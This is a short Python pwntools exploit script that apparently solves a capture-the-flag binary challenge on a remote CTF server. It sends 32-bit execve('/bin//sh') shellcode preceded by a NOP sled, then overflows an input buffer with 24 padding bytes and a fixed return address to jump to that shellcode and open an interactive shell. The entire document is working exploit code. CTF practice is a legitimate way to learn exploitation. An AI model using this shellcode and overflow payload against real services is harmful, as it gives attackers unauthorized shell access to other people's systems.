from pwn import *

# p = process("./prob1")
p = remote('ctf.j0n9hyun.xyz', 3003)
p.recvuntil('Name : ')
shellcode = b"\x90"*20+b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

p.sendline(shellcode)

print("sended shellcode")

shell_addr = p32(0x804a060)
p.recvuntil('input : ')
payload = b"a"*24 + shell_addr
p.sendline(payload)

p.interactive()
